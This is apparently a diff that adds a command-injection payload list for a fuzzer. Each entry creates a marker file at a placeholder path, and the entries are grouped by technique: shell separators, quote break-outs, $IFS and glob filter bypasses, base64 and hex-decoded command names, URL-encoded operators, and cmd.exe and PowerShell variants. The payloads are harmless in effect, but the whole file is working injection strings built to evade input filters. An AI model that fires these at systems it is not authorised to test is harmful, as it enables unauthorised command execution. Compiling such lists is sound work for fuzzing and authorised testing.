@@ -1,0 +1,167 @@
+# File-creation payloads. Placeholder: {FILE}
+# Creating a marker file is a benign, non-destructive proof of command
+# execution (point {FILE} at a web-reachable path to confirm RCE). Techniques
+# from SecLists, PayloadsAllTheThings and HackTricks: alternate creation tools,
+# command-name obfuscation, $IFS/space bypass, wildcard/glob paths, decoders,
+# injection separators, quote break-outs, URL-encoded operators and Windows.
+# One payload per line; blank lines and lines starting with '#' are ignored.
+
+# ============================================================
+# 1. creation -- coreutils / shell redirections
+# ============================================================
+touch {FILE}
+touch -- {FILE}
+/bin/touch {FILE}
+busybox touch {FILE}
+> {FILE}
+>{FILE}
+>> {FILE}
+: > {FILE}
+: >{FILE}
+echo > {FILE}
+echo '' > {FILE}
+echo pwned > {FILE}
+echo -n > {FILE}
+printf '' > {FILE}
+printf pwned > {FILE}
+cat /dev/null > {FILE}
+cat < /dev/null > {FILE}
+cp /dev/null {FILE}
+cp -- /dev/null {FILE}
+install /dev/null {FILE}
+install -m644 /dev/null {FILE}
+dd if=/dev/null of={FILE}
+dd of={FILE} if=/dev/null count=0
+truncate -s0 {FILE}
+truncate -s 0 {FILE}
+tee {FILE} < /dev/null
+tee -a {FILE} < /dev/null
+head -c0 /dev/null > {FILE}
+mkfifo {FILE}
+mknod {FILE} p
+
+# ============================================================
+# 2. interpreters
+# ============================================================
+python3 -c 'open("{FILE}","w").close()'
+python -c 'open("{FILE}","w")'
+perl -e 'open(F,">","{FILE}")'
+php -r 'touch("{FILE}");'
+php -r 'file_put_contents("{FILE}","pwned");'
+ruby -e 'File.write("{FILE}","pwned")'
+node -e 'require("fs").closeSync(require("fs").openSync("{FILE}","w"))'
+node -e 'require("fs").writeFileSync("{FILE}","")'
+lua -e 'io.open("{FILE}","w"):close()'
+awk 'BEGIN{print "" > "{FILE}"}'
+
+# ============================================================
+# 3. command-name obfuscation (quotes / backslash / concat)
+# ============================================================
+t'o'uch {FILE}
+to"u"ch {FILE}
+tou''ch {FILE}
+'touch' {FILE}
+\touch {FILE}
+t\ouch {FILE}
+to\uch {FILE}
+tou\ch {FILE}
+t$@ouch {FILE}
+t${u}ouch {FILE}
+$(echo touch) {FILE}
+`echo touch` {FILE}
+
+# ============================================================
+# 4. wildcard / glob binary paths
+# ============================================================
+/bin/t?uch {FILE}
+/bin/to?ch {FILE}
+/bin/tou?h {FILE}
+/???/touch {FILE}
+/bin/touch* {FILE}
+/usr/bin/t?uch {FILE}
+{/bin/touch,{FILE}}
+
+# ============================================================
+# 5. decoders -- command name from base64 / hex / octal
+# ============================================================
+$(echo dG91Y2g=|base64 -d) {FILE}
+$(echo${IFS}dG91Y2g=|base64${IFS}-d) {FILE}
+$(printf '\x74\x6f\x75\x63\x68') {FILE}
+$(printf '\164\157\165\143\150') {FILE}
+
+# ============================================================
+# 6. space / $IFS bypass
+# ============================================================
+touch${IFS}{FILE}
+touch$IFS{FILE}
+touch$IFS$9{FILE}
+touch$(printf '\t'){FILE}
+{touch,{FILE}}
+
+# ============================================================
+# 7. injection separators / chaining
+# ============================================================
+; touch {FILE}
+;touch {FILE}
+& touch {FILE}
+&touch {FILE}
+&& touch {FILE}
+| touch {FILE}
+|touch {FILE}
+|| touch {FILE}
+`touch {FILE}`
+$(touch {FILE})
+$(touch${IFS}{FILE})
+%0atouch {FILE}
+%0atouch%20{FILE}
+%0d%0atouch {FILE}
+%0abash%09-c%09"touch%09{FILE}"%0a
+
+# ============================================================
+# 8. quote / context break-out
+# ============================================================
+'; touch {FILE}; '
+'; touch {FILE} #
+"; touch {FILE}; "
+"; touch {FILE} #
+' && touch {FILE} && '
+" && touch {FILE} && "
+'|touch {FILE}|'
+"|touch {FILE}|"
+'$(touch {FILE})'
+"$(touch {FILE})"
+
+# ============================================================
+# 9. URL-encoded operators (HTTP parameter contexts)
+# ============================================================
+%3Btouch%20{FILE}
+%7Ctouch%20{FILE}
+%26touch%20{FILE}
+%60touch%20{FILE}%60
+%24%28touch%20{FILE}%29
+%0Atouch%20{FILE}
+%0D%0Atouch%20{FILE}
+touch%09{FILE}
+
+# ============================================================
+# 10. Windows (cmd.exe / PowerShell)
+# ============================================================
+type nul > {FILE}
+type nul>{FILE}
+copy nul {FILE}
+copy /y nul {FILE}
+echo.> {FILE}
+cd. > {FILE}
+break > {FILE}
+rem. > {FILE}
+fsutil file createnew {FILE} 0
+cmd /c type nul > {FILE}
+ty^pe nul > {FILE}
+& type nul > {FILE}
+| type nul > {FILE}
+&& type nul > {FILE}
+powershell -c "New-Item -Path '{FILE}' -ItemType File -Force"
+powershell -c "'' | Out-File '{FILE}'"
+powershell -c "Set-Content '{FILE}' ''"
+powershell -c "[IO.File]::Create('{FILE}').Close()"
+powershell -c "ni '{FILE}'"
